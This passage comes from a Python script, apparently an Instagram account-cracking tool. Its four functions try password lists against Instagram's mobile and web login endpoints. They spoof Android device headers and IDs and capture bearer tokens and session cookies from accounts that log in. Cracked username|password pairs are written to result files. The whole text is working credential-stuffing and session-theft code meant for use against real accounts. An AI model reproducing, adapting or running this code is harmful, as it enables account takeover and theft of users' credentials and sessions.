	return random.choice([realme, huawai, samsung, xiaomi, vivo, oppo, iphone, iphone_x, google_pixel, infinix, pragmatyc])

def Crack_api(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	print(f" {b}[{P}●{b}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {b}{Ok} {P}Failed {k}{Cp}", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentApp()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({
				'x-fb-http-engine': 'Liger',
				'Host': 'i.instagram.com',
				'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
				'x-ig-capabilities': '3brTv10=',
				'x-ig-device-id': device_id,
				'x-tigon-is-retry': 'True, True',
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'connection': 'keep-alive',
				'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
				'x-ig-www-claim': '0',
				'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
				'x-ig-mapped-locale': 'id_ID',
				'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
				'x-ig-app-locale': 'in_ID',
				'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
				'user-agent': uag,
				'x-ig-family-device-id': family_device_id,
				'x-bloks-is-layout-rtl': 'False',
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-fb-server-cluster': 'True',
				'accept-language': 'id-ID, en-US',
				'ig-intended-user-id': '0',
				'x-ig-app-id': '3419628305025917',
				'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
				'priority': 'u=3',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-ig-device-locale': 'in_ID',
				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
				'x-fb-client-ip': 'True'
			})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C %22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}[{P}●{b}]{P} Target Data Information")
				print(f"     {b}＼{P} Fullnames :{b} {fullname} ")
				print(f"     {b}＼{P} Usernames :{b} {username} ")
				print(f"     {b}＼{P} Passwords :{b} {password} ")
				print(f"     {b}＼{P} Followers :{b} {peng} ")
				print(f"     {b}＼{P} Following :{b} {meng} ")
				print(f"     {b}＼{P} Mycookies :{b} {ig_set_authorization}{cookies} \n")
				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {uag}\n ")
				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def Crack_i(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	print(f" {b}[{P}●{b}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {b}{Ok} {P}Failed {k}{Cp}", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ua = UserAgentApp()
			ses = requests.Session()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}[{P}●{b}]{P} Target Data Information")
				print(f"     {b}＼{P} Fullnames :{b} {fullname} ")
				print(f"     {b}＼{P} Usernames :{b} {username} ")
				print(f"     {b}＼{P} Passwords :{b} {password} ")
				print(f"     {b}＼{P} Followers :{b} {peng} ")
				print(f"     {b}＼{P} Following :{b} {meng} ")
				print(f"     {b}＼{P} Autorized :{b} {ig_set_authorization} \n")
				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {ua}\n ")
				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def cookie_bearer(cookie):
	abcd = json.loads(base64.b64decode(cookie).decode())
	coki = ';'.join(['%s=%s' % (x, y) for x, y in abcd.items()])
	return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'

def x_mid(mid_list):
	if len(mid_list) > 0:
		return random.choice(mid_list)
	lr = 'abcdefghijklmnopqrstuvwxyz1234567890'
	xc = ''.join(random.choice(lr.upper()) for _ in range(6))
	return f'ZpFI1wABAAET6tZpG_yS09{xc}'



def crack_ajax(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([m, b, k, h, u])
	sys.stdout.write(f"\r{b}╰─{b}▶◀{b}[{bo}{Loop}{b}/{bo}{str(len(Uuid))}{b}]{b}▶◀{b}[{b}{Ok}{b}]{b}▶◀{b}[{k}{Cp}{b}]{b}▶◀{b}[{bo}{'{:.0%}'.format(Loop/float(len(Uuid)))}{b}]  ")
	sys.stdout.flush()    
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentApp()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			# Update headers
			headers = {
				'host': 'i.instagram.com',
				'x-ig-app-locale': 'en_US',
				'x-ig-device-locale': 'in_ID',
				'x-ig-mapped-locale': 'en_US',
				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
				'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
				'x-ig-bandwidth-speed-kbps': f'{random.randint(50, 250)}.000',
				'x-ig-bandwidth-totalbytes-b': '0',
				'x-ig-bandwidth-totaltime-ms': '0',
				'x-bloks-version-id': '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
				'x-ig-www-claim': '0',
				'x-bloks-is-prism-enabled': 'false',
				'x-bloks-is-layout-rtl': 'false',
				'x-ig-device-id': device_id,
				'x-ig-family-device-id': family_device_id,
				'x-ig-android-id': f'android-{str(uuid.uuid4())[:16]}',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'x-ig-capabilities': '3brTv10=',
				'x-ig-app-id': '567067343352427',
				'priority': 'u=3',
				'user-agent': uag,
				'x-mid': '567067343352427',  # Ganti dengan nilai MID yang sesuai
				'ig-intended-user-id': '0',
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'accept-encoding': 'gzip, deflate',
				'x-fb-http-engine': 'Liger',
				'x-fb-client-ip': 'True',
				'x-fb-server-cluster': 'True',
				'x-requested-with': 'com.instagram.android',
				'Connection': 'keep-alive'}
			ses.headers.update(headers)
			data = (f'params=%7B %22client_input_params%22%3A%7B%22device_id%22%3A%22{device_id}%22%2C%22name%22%3A%22{username}%22%2C%22machine_id%22%3A%22{str(uuid.uuid4())}%22%2C%22contact_point%22%3A%22{username}%22%2C%22encrypted_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{round(time.time())}%3A{password}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%229fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, allow_redirects=True)

			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or "logged_in_user" in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
					except Exception:
						cookies = '-'
				except Exception:
					ig_set_authorization = None

				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)  # Pastikan data_target didefinisikan
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}╰─{b}▶{P} Fullname   :{b} {fullname} ")
				print(f" {b}╰─{b}▶{P} Username   :{b} {username} ")
				print(f" {b}╰─{b}▶{P} Password   :{b} {password} ")
				print(f" {b}╰─{b}▶{P} Followers  :{b} {peng} ")
				print(f" {b}╰─{b}▶{P} Following  :{b} {meng} ")
				print(f" {b}╰─{b}▶{P} Postingan  :{b} {post} ")
				print(f" {b}╰─{b}▶{P} Cookie     :{b} {cookies} ")
				open(f'RESULTS-INSTAGRAM/{Okc}', 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
				print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
				print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
				print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
				print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def crack(username, memek):
    global Ok, Cp, Loop
    bo = random.choice([m, b, k, h, u])
    sys.stdout.write(f"\r{b}╰─{b}▶◀{b}[{bo}{Loop}{b}/{bo}{str(len(Uuid))}{b}]{b}▶◀{b}[{b}{Ok}{b}]{b}▶◀{b}[{k}{Cp}{b}]{b}▶◀{b}[{bo}{'{:.0%}'.format(Loop/float(len(Uuid)))}{b}]  ")
    sys.stdout.flush()    
    for password in memek:
        try:
            url = 'https://www.instagram.com/accounts/login/ajax/'
            response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
            csrf_token = response.cookies.get('csrftoken')
            login_headers = {
                'User-Agent': generate_random_ua(),
                'X-CSRFToken': csrf_token,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
            }

            data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
            }

            login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
            if 'Bearer IGT:2:' in str(login_response.text.replace('\\', '')) and '"pk_id":' in str(login_response.text.replace('\\', '')) or "logged_in_user" in str(login_response.text.replace('\\', '')):
                x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
                x_json = x.json()["data"]["user"]
                pengikut = x_json["edge_followed_by"]["count"]
                mengikut = x_json["edge_follow"]["count"]
                postingan = x_json["edge_owner_to_timeline_media"]["count"]
                cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
                print(f"\n{B}{username} {password}{N}")
                print(f"{H}Followers: {O}{pengikut}{N}")
                print(f"{H}Posts: {O}{postingan}{N}")
                print(f"{H}Following: {O}{mengikut}{N}")
                print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
            elif 'challenge_required' in str(login_response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(login_response.text.replace('\\', '')):
                Cp += 1
                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                print(f"                                                                ", end='\r')
                time.sleep(0.10)
                print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
                print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
                print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
                print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
                print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
                open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1

if __name__=='__main__':
	menu()